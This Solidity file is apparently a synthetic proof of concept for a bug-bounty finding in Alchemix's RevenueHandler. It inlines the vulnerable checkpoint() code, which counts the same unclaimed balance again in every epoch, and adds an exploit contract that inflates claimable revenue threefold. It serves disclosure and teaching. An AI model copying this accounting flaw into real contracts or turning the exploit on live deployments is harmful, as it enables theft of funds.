// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Alchemix — RevenueHandler.checkpoint isn't correct when poolAdapter is 0
    (Immunefi, jasonxiale, finding #38174)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. The vulnerable
    checkpoint() body (poolAdapter == 0 / non-alchemic-token path) is inlined
    VERBATIM; the Exploit deploys a reduced RevenueHandler, deposits 1000 DAI
    ONCE, checkpoints THREE times with no new revenue ever arriving, and
    shows claimable revenue climbs 1000 -> 2000 -> 3000 while the real DAI
    balance never leaves 1000 — matching this finding's own PoC output
    exactly (no fork, no time-warp cheatcodes: the once-per-epoch guard is
    driven by an explicit scaffold flag).

    Root cause: for a revenue token with poolAdapter == address(0) (a plain,
    non-alchemic-token like DAI), checkpoint() does
        amountReceived = thisBalance;           // thisBalance = balanceOf(this)
        epochRevenues[currentEpoch][token] += amountReceived;
    `thisBalance` is the contract's WHOLE current balance, which still
    contains any revenue recorded (but not yet claimed) in earlier epochs.
    Every checkpoint() therefore adds the SAME unclaimed balance again,
    so `epochRevenues` — and every holder's claimable total — grows once
    per checkpoint call with no relationship at all to actual token inflows.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @notice Reduced RevenueHandler. `advanceEpoch()` is test scaffolding that
///         marks a new epoch as ready to checkpoint — standing in for the
///         real `block.timestamp >= currentEpoch + WEEK` guard so the PoC
///         needs no time-warp cheatcodes. This affects ONLY the once-per-
///         epoch gating; the vulnerable accounting line below is untouched
///         and verbatim.
contract RevenueHandler {
    uint256 public currentEpoch;
    address public token; // a poolAdapter == address(0) revenue token, e.g. DAI
    bool private epochReady = true;

    mapping(uint256 => mapping(address => uint256)) public epochRevenues;

    constructor(address _token) {
        token = _token;
    }

    /// @dev Test scaffolding only — marks that a new epoch has elapsed.
    function advanceEpoch() external {
        epochReady = true;
    }

    /**
     * @notice checkpoint — must be called once per epoch to record revenue
     */
    function checkpoint() public {
        // only run checkpoint() once per epoch
        if (epochReady) {
            epochReady = false;
            currentEpoch += 1;

            uint256 thisBalance = MockToken(token).balanceOf(address(this));

            // poolAdapter == address(0): the revenue token is not an alchemic-token
            uint256 amountReceived = thisBalance;

            // @> VULN: thisBalance is the WHOLE current balance -- it still contains
            //          any revenue recorded (but unclaimed) in earlier epochs, so it
            //          gets recorded AGAIN as if it were freshly-arrived revenue.
            epochRevenues[currentEpoch][token] += amountReceived;
            // FIX: amountReceived = thisBalance - lastCheckpointedBalance[token]; lastCheckpointedBalance[token] = thisBalance;
        }
    }

    /// @notice Simplified claimable: this reduction models a single holder who
    ///         always owns 100% of the ve supply at every epoch, so their
    ///         claimable total is the SUM of every recorded epoch's revenue.
    function claimable(address _token) external view returns (uint256 total) {
        for (uint256 e = 1; e <= currentEpoch; e++) {
            total += epochRevenues[e][_token];
        }
    }
}

/// @notice Demonstrates the exact 3-checkpoint progression from the finding's
///         own PoC: claimable climbs 1000 -> 2000 -> 3000 while the real
///         token balance never changes from 1000.
contract Exploit {
    MockToken public dai;
    RevenueHandler public revenueHandler;

    uint256 public constant REV_AMOUNT = 1000 ether;

    constructor() {
        dai = new MockToken();
        revenueHandler = new RevenueHandler(address(dai));
        dai.mint(address(revenueHandler), REV_AMOUNT);
    }

    function run() external {
        revenueHandler.checkpoint();
        uint256 claim1 = revenueHandler.claimable(address(dai));
        require(claim1 == REV_AMOUNT, "checkpoint #1 should correctly record 1000 DAI");

        revenueHandler.advanceEpoch();
        revenueHandler.checkpoint();
        uint256 claim2 = revenueHandler.claimable(address(dai));
        // HARM: claim2 doubles even though the ONLY DAI ever transferred in was
        // the original 1000 — matching the finding's own reported progression.
        require(claim2 == REV_AMOUNT * 2, "harm not demonstrated: claimable should double after checkpoint #2");

        revenueHandler.advanceEpoch();
        revenueHandler.checkpoint();
        uint256 claim3 = revenueHandler.claimable(address(dai));
        require(claim3 == REV_AMOUNT * 3, "harm not demonstrated: claimable should triple after checkpoint #3");

        uint256 realBalance = dai.balanceOf(address(revenueHandler));
        // HARM confirmed: only 1000 DAI was EVER transferred in, but the tokenId
        // can now claim 3000 -- a 2000 DAI shortfall the contract cannot honor.
        require(realBalance == REV_AMOUNT, "sanity: no new DAI should have arrived");
        require(claim3 == realBalance * 3, "harm not demonstrated: claimable should be 3x the real balance");
    }
}
